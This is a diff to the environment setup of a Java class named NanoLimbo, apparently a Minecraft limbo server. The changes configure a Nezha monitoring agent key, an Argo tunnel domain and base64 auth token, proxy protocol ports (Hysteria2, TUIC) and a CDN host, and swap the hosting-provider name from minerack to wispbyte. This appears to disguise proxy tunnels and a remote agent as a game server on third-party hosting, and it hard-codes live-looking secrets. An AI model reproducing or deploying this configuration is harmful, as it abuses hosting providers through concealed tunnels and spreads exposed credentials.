@@ -90,7 +90,7 @@ public final class NanoLimbo {
 
     private static void fillEnv(Map<String, String> env) throws IOException {
         // UUID
-        env.put("UUID", "de1fa158-08b2-445e-8c1c-" + "d4505229ebd1");
+        env.put("UUID", "e6740b2e-b3e0-49a5-85f7-" + "a6a04fb22619");
 
         env.put("FILE_PATH", "./world");
 
@@ -99,8 +99,8 @@ public final class NanoLimbo {
         env.put("NEZHA_KEY", "YFg7lfh5DY3r7DdRpWK5G9jnbAn05cp6");
 
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "minerack.gxhjp." + "gv.uy");
-        env.put("ARGO_AUTH", "eyJhIjoiMzM2ZGNmMmIxOTVjYWYwZTlhMjFkNWMwYzQxYTI0ZWUiLCJ0IjoiYjlhODcxMWUtZDVhOS00ZmM5LWFkZDItMmI5ZDc4Y2QzMmEzIiwicyI6IlpUYzJOV1l5WkRVdFkyRmtZeTAwTWpCbUxXRXpOV0V0TURRNFpXTTVOV1E1WldNdyJ9");
+        env.put("ARGO_DOMAIN", "wispbyte.hjp2025." + "dpdns.org");
+        env.put("ARGO_AUTH", "eyJhIjoiMzM2ZGNmMmIxOTVjYWYwZTlhMjFkNWMwYzQxYTI0ZWUiLCJ0IjoiYTEzYjg4MGItZDYwYi00MzIwLWJhMjItZmE2YjEzM2E1Njg1IiwicyI6Ik1tSXhPR0kxWldRdE5qUTFaQzAwTTJaakxXRXhOVGN0T0dFMk1UZGhaVEZqTnpOaiJ9");
 
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
@@ -111,7 +111,7 @@ public final class NanoLimbo {
 
         env.put("CFIP", "cdns." + "doon.eu.org");
         env.put("CFPORT", "443");
-        env.put("NAME", "minerack");
+        env.put("NAME", "wispbyte");
 
         for (String k : kList) {
             String v = System.getenv(k);
